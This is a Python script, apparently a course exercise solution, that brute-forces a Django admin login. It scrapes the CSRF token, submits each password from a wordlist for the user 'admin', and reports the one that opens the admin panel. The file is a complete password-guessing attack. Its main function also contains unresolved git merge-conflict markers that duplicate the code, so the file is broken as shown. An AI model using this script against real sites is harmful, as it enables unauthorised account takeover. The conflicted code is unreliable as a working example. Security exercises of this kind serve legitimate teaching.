import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):

<<<<<<< HEAD
	session = requests.Session()

	url = address + '/admin/login/?next=/admin/'
	response = session.get(url)

	csrf_token = extract_token(response)


	for password in candidates:
		logIn_Data = {
			'username': 'admin',
			'password': password,
			'csrfmiddlewaretoken': csrf_token
		}
		response = session.post(url, data=logIn_Data)
	
		if isloggedin(response):
			return password	
	return None
=======
        session = requests.Session()

        url = address + '/admin/login/?next=/admin/'
        response = session.get(url)

        csrf_token = extract_token(response)


        for password in candidates:
                logIn_Data = {
                        'username': 'admin',
                        'password': password,
                        'csrfmiddlewaretoken': csrf_token
                }
                response = session.post(url, data=logIn_Data) 

                if isloggedin(response):
                        return password 
        return None

>>>>>>> cf1ba96d7c852b6ea5e9ae86237edab57b636920



def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
